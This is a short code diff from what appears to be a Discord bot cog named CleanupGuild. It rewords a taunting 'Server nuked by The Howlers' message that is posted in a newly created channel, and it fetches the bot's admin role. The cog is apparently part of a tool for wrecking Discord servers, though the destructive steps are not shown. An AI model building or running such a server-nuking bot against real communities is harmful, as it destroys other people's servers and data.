@@ -30,7 +30,7 @@ class CleanupGuild(commands.Cog):
         channel = await guild.create_text_channel(channel_title, category=category)
 
         # Send a cleanup message in the new channel
-        await channel.send("Server nuked by The Howler. Good luck fixing this mess! *hugz*")
+        await channel.send("Server nuked by The Howlers. Good luck fixing the mess we made!")
 
         # Get the bot's admin role (the top role)
         bot_role = guild.get_member(self.bot.user.id).top_role
